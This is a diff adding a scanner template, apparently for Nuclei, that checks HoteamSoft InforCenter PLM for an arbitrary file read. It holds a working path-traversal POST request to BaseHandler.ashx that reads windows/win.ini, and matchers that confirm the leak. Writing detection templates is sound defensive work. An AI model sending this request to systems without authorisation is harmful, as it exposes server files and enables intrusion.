@@ -1,0 +1,33 @@
+id: hoteamsoft-inforcenter-plm-basehandler-anyfile-read
+info:
+  name: HoteamSoft InforCenter PLM BaseHandler Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /Base/BaseHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        type=downloadFile&extensionName=config&fileName=../../windows/win.ini
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: regex
+        part: header
+        regex:
+          - "attachment;filename=.*"
